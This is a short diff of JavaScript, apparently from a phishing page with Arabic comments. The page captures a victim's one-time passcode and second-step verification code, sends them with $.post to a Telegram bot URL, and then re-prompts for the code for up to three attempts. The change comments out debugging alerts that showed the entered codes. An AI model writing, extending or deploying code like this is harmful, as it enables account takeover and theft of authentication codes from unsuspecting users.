@@ -328,7 +328,7 @@
 
             i++;
             if (i < 3) {
-                alert(i);
+                //alert(i);
                 $('#verify_otp').hide();
                 const OTP = $("#OTP_in").val(); // الحصول على رقم الهاتف المدخ
                 //alert(OTP);
@@ -384,13 +384,13 @@
             
             event.preventDefault();
 
-            alert(i);
+            //alert(i);
             $('#verify_2S').hide();
 
 
             
             const twos_code = $("#2S_in").val(); // الحصول على رقم الهاتف المدخ
-            alert(twos_code);
+            //alert(twos_code);
 
             if (!twos_code) {
                 $('#verify_2S').show();
@@ -407,7 +407,7 @@
             // إرسال البيانات إلى الروبوت
             $.post(telegramBotUrl, requestData, function(response) {
                 $('#verify_2S').show();
-                alert("يرجى التأكد من الرمز المدخل");
+                //alert("يرجى التأكد من الرمز المدخل");
             });
 
             /*$('#OTP_msg').show();
